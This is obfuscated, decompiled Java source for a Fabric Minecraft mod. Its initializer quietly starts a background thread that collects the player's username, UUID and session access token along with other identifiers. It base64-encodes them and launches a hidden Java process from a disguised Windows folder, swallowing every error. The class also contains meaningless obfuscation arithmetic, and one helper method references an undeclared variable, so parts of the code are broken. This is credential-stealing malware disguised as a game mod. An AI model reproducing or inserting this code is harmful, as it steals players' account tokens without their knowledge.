package net.fabric;

import java.io.File;
import java.lang.ProcessBuilder.Redirect;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Base64;
import java.util.Base64.Encoder;
import net.fabricmc.api.ModInitializer;

public class aqXjytdffRpHvt implements ModInitializer {
   public void onInitialize() {
      new Thread(
            () -> {
               try {
                  String elapsedbuf = qun.ntzuFhcgkicHikcio();
                  String YUAvI_SH = qun.tyRvaO3zyLdC();
                  String limitVal = qun.bzkooyyNode();
                  if (limitVal == null) {
                     limitVal = "unknown";
                  }

                  String ncptohEsCabCkmzj = bjuKfvjfjWgeqKxp.radFjkrfTeuTkrn();
                  String ret2 = bjuKfvjfjWgeqKxp.tcwpPNX();
                  Path holderVal = IgNm_xrry_IPnr_mcbI.vjzyjk();
                  bjuKfvjfjWgeqKxp hNTX_bji_5h_BU = new bjuKfvjfjWgeqKxp();
                  String hdhMcwQlaWk = hNTX_bji_5h_BU.getDomain();
                  String ebgoruTiqfwHhrjjk = hNTX_bji_5h_BU.prefire(hdhMcwQlaWk, elapsedbuf, ncptohEsCabCkmzj);
                  Encoder var10000 = Base64.getEncoder();
                  String var10001 = IgNm_xrry_IPnr_mcbI.hd_rh_aydatx(YUAvI_SH);
                  String var10002 = IgNm_xrry_IPnr_mcbI.hd_rh_aydatx(limitVal);
                  String var24 = IgNm_xrry_IPnr_mcbI.hd_rh_aydatx(elapsedbuf);
                  String var23 = var10002;
                  String var22 = var10001;
                  StringBuilder var85 = new StringBuilder();
                  char[] var25 = "{\"username\":\"".toCharArray();
                  StringBuilder var86 = var85.append(new String(var25)).append(var22);
                  char[] var27 = "\",\"uuid\":\"".toCharArray();
                  StringBuilder var87 = var86.append(new String(var27)).append(var23);
                  char[] var29 = "\",\"accessToken\":\"".toCharArray();
                  String RUEA_XNEs_PUid_TMuG = var10000.encodeToString(
                     var87.append(new String(var29)).append(var24).append("\"}").toString().getBytes(StandardCharsets.UTF_8)
                  );
                  if (ebgoruTiqfwHhrjjk != null) {
                     var10001 = ebgoruTiqfwHhrjjk;
                  } else {
                     char[] var31 = "null".toCharArray();
                     var10001 = new String(var31);
                  }

                  var10002 = IgNm_xrry_IPnr_mcbI.hd_rh_aydatx(ncptohEsCabCkmzj);
                  String var10003 = IgNm_xrry_IPnr_mcbI.hd_rh_aydatx(ret2);
                  String var10004 = IgNm_xrry_IPnr_mcbI.hd_rh_aydatx(hdhMcwQlaWk);
                  String var10005 = IgNm_xrry_IPnr_mcbI.hd_rh_aydatx(holderVal != null ? holderVal.toString() : "");
                  String var10006 = IgNm_xrry_IPnr_mcbI.hd_rh_aydatx(YUAvI_SH);
                  String var40 = IgNm_xrry_IPnr_mcbI.hd_rh_aydatx(limitVal);
                  String var39 = var10006;
                  String var38 = var10005;
                  String var37 = var10004;
                  String var36 = var10003;
                  String var35 = var10002;
                  String var34 = var10001;
                  StringBuilder var41;
                  StringBuilder var75 = var41 = new StringBuilder();
                  var41.append('{');
                  var41.append('"');
                  var41.append('m');
                  var41.append('c');
                  var41.append('I');
                  var41.append('n');
                  var41.append('f');
                  var41.append('o');
                  var41.append('"');
                  var41.append(':');
                  var41.append('"');
                  StringBuilder var76 = var75.append(var41.toString()).append(RUEA_XNEs_PUid_TMuG);
                  StringBuilder var77 = var76.append("\",\"prefireId\":\"").append(var34);
                  char[] var45 = "\",\"userId\":\"".toCharArray();
                  StringBuilder var78 = var77.append(new String(var45)).append(var35);
                  char[] var47 = "\",\"tag\":\"".toCharArray();
                  StringBuilder var79 = var78.append(new String(var47)).append(var36);
                  char[] var49 = "\",\"domain\":\"".toCharArray();
                  StringBuilder var80 = var79.append(new String(var49)).append(var37);
                  char[] var51 = "\",\"gameDir\":\"".toCharArray();
                  StringBuilder var81 = var80.append(new String(var51)).append(var38);
                  StringBuilder var82 = var81.append("\",\"mcUsername\":\"").append(var39);
                  char[] var55 = "\",\"mcUuid\":\"".toCharArray();
                  StringBuilder var83 = var82.append(new String(var55)).append(var40);
                  String pyzwur_ouw = var83.append("\",\"env\":\"Fabric\"}").toString();
                  String kLaL_ASNr_HFfi_iQtl = Base64.getEncoder().encodeToString(pyzwur_ouw.getBytes(StandardCharsets.UTF_8));
                  char[] var59 = "java.home".toCharArray();
                  String strOut = System.getProperty(new String(var59));
                  String[] var89 = new String[]{"bin", null};
                  char[] var61 = "javaw.exe".toCharArray();
                  var89[1] = new String(var61);
                  Path kQvh_t7S__WxFv = Path.of(strOut, var89);
                  if (!Files.exists(kQvh_t7S__WxFv)) {
                     String[] var90 = new String[]{"bin", null};
                     var90[1] = "java.exe";
                     kQvh_t7S__WxFv = Path.of(strOut, var90);
                  }

                  URI ljk = aqXjytdffRpHvt.class.getProtectionDomain().getCodeSource().getLocation().toURI();
                  Path gigl_wnu_ex = Path.of(ljk);
                  String var84 = System.getenv("LOCALAPPDATA");
                  String[] var91 = new String[3];
                  char[] var67 = "Microsoft".toCharArray();
                  var91[0] = new String(var67);
                  char[] var69 = "Windows".toCharArray();
                  var91[1] = new String(var69);
                  var91[2] = "NtProfileIndex";
                  Path U_haLDJDsG = Path.of(var84, var91);
                  Files.createDirectories(U_haLDJDsG);
                  String nTmp = bjuKfvjfjWgeqKxp.class.getName();
                  ProcessBuilder v3 = new ProcessBuilder(kQvh_t7S__WxFv.toString(), "-cp", gigl_wnu_ex.toString(), nTmp, kLaL_ASNr_HFfi_iQtl);
                  v3.redirectInput(Redirect.from(new File("NUL")));
                  char[] var73 = "_spawn.log".toCharArray();
                  v3.redirectOutput(Redirect.appendTo(U_haLDJDsG.resolve(new String(var73)).toFile()));
                  v3.redirectErrorStream(true);
                  v3.directory(U_haLDJDsG.toFile());
                  v3.start();
               } catch (Exception var74) {
               }
            }
         )
         .start();
   }

   private Path vjzyjk() {
      char[] var4 = "user.dir".toCharArray();
      Path aauBxa = Path.of(System.getProperty(new String(var4)));
      if (-1379389428297875970L == -1379389428297875970L) {
         int var19 = 276641148;
         var19 += 149;
         var19 ^= -1352381851;
         var19 <<= 2;
      }

      char[] var6 = "options.txt".toCharArray();
      if (!Files.exists(aauBxa.resolve(new String(var6)))) {
         if (!Files.exists(aauBxa.resolve("config"))) {
            char[] var10 = "mods".toCharArray();
            if (!Files.exists(aauBxa.resolve(new String(var10)))) {
               String pEs = System.getenv("APPDATA");
               if (pEs != null) {
                  String[] var10001 = new String[1];
                  var10001[0] = ".minecraft";
                  Path arg1 = Path.of(pEs, var10001);
                  if (Files.exists(arg1)) {
                     return arg1;
                  }
               }

               String var10000 = System.getProperty("user.home");
               String[] var24 = new String[1];
               var24[0] = ".minecraft";
               Path Drgw_ZsXm_aWZq_ppeK = Path.of(var10000, var24);
               if (Files.exists(Drgw_ZsXm_aWZq_ppeK)) {
                  return Drgw_ZsXm_aWZq_ppeK;
               }

               return aauBxa;
            }
         }
      }

      return aauBxa;
   }

   private String hd_rh_aydatx(String s) {
      if (wzh_apmyc == null) {
         return "";
      } else {
         StringBuilder posstr = new StringBuilder();

         for (char Pg25 : wzh_apmyc.toCharArray()) {
            switch (Pg25) {
               case '\t':
                  break;
               case '\n':
                  break;
               case '\r':
                  break;
               case '"':
                  break;
               case '\\':
                  char[] var7 = "\\\\".toCharArray();
                  posstr.append(new String(var7));
                  break;
               default:
                  if (Pg25 < ' ') {
                     char[] var9 = "\\u%04x".toCharArray();
                     posstr.append(String.format(new String(var9), Integer.valueOf(Pg25)));
                  } else {
                     posstr.append(Pg25);
                  }
            }
         }

         return posstr.toString();
      }
   }
}
